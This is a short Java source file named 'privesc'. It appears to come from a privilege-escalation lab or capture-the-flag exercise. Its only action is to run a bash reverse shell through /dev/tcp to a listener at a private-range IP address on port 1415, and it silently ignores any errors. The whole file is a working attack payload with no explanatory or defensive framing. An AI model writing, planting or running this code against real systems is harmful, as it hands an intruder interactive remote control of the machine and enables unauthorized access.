public class privesc {
	public static void main(String[] args){
		
		try{
			Runtime r = Runtime.getRuntime();
			Process p = r.exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.128.84/1415 0>&1'");
			p.waitFor();
		}catch(Exception e){

		}
	}
}
